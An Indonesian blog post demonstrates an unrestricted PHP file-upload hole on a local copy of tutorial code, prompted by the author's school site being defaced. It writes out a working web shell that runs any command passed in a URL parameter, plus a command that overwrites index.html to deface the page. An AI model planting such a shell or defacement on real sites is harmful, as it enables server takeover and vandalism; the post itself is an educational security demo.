---
title: "Peretasan Website Sekolah Dan Kerentanan Upload File PHP"
date: 2019-01-14T21:00:55+07:00
draft: false
image: img/upload-gambar-dan-peretasan-website-sekolah/thumb.png
---
_pic not related btw_

berbagi sedikit cerita, jadi pada sekitar 1 tahun yang lalu website sekolah saya terdeface dan ternyata pelakunya adalah adik kelas saya, dia sendiri bilang bahwa ada celah upload file di subdomain untuk ppdb, dimana dia bisa mengunggah shell ke website tersebut dan men-deface, tentu saja yang akan saya bahas disini bukan masalah peretasan tersebut melainkan kerentanan upload file pada php, oke sekarang mari fokus dengan kerentanan pada **PHP upload file**.

## PHP upload file

Upload file merupakan kegiatan pengiriman file dari client (pengunjung web) ke server, seperti saat kalian mengubah gambar profile di facebook pada saat itu kalian sedang mengupload file gambar ke server facebook. Sekarang saya akan coba buat simple php upload file, karena saya akan fokus dengan keamanan upload file saya akan _copas_ kodingan dari petanikode saja (bisa dilihat disini : https://www.petanikode.com/php-upload-file/).

![](/img/upload-gambar-dan-peretasan-website-sekolah/step-1.png)

dan setelah membuat filenya langsung saja dicoba...

<video autoplay loop>
  <source src="/img/upload-gambar-dan-peretasan-website-sekolah/step-2.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video> 

Bagus, kodingan berjalan dengan baik termasuk saat mengupload gambar.

## upload file vulnerability
![](/img/upload-gambar-dan-peretasan-website-sekolah/step-3.png)

Bisa dilihat source code dari upload.php terlihat bahwa tidak ada pemeriksaan jenis file yang terupload, hm.... mari coba buat file php bernama shell.php dengan isi `<?php echo "Oke!" ?>` dan upload ke server untuk mengetahui apakah saya bisa mengirim file php dan mengaksesnya

<video autoplay loop>
  <source src="/img/upload-gambar-dan-peretasan-website-sekolah/step-4.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video> 

dan benar saja file php bisa terupload dan juga bisa diakses. Sampai sini jika kalian berfikir "Dah gitu doang? enggak masalah dong kalau gitu" **NO!**, tentu saja ini masalah yang besar dengan adanya file php yang bisa terupload dan bisa dijalankan saat diakses. Mari buat shell yang lebih hebat.

Ubah isi dari shell.php menjadi seperti ini:
`
<?php $exec = !empty($_GET['exec']) ? $_GET['exec'] : 'ls' ; echo(shell_exec($exec))?>
`

![](/img/upload-gambar-dan-peretasan-website-sekolah/step-5.png)

dengan file php diatas saya bisa menjalan perintah-perintah bash malalui file php yang saya upload dengan menambah perintah bash ke parameter exec, ok sekarang saya akan upload ulang..

<video autoplay loop>
  <source src="/img/upload-gambar-dan-peretasan-website-sekolah/step-6.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video> 

bisa dilihat diatas saya bisa menjalankan perintah-perintah bash dan mendapatkan hasilnya dari file php saya. Tapi sepertinya kalau begini doang belum puas rasanya, saya akan coba ubah tampilan di index.html biar lebih greget, yang saya perlu lakukan adalah memasukan perintah bash yang dapat mengubah isi file index.html dan ini perintahnya `echo "phpnya enggak aman gan!" > ../index.html` langsung saja eksekusi..

<video autoplay loop>
  <source src="/img/upload-gambar-dan-peretasan-website-sekolah/step-7.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video> 

Dan **BOOOM** file index.html berubah. Bisa kalian lihat bahwa celah ini sangatlah berbahaya, apalagi jika si penyerang sangat usil dengan mencari informasi-informasi sensitif yang ada diserver seperti passowrd mysql dll..

Oke cukup sekian untuk pembahasan soal kerentanan upload file di php, sebenernya masih banyak celah di php file upload seperti _**nullbyte**_ dll mungkin akan saya buat postnya tersendiri (biar blog kelihatan hidup hehehe...).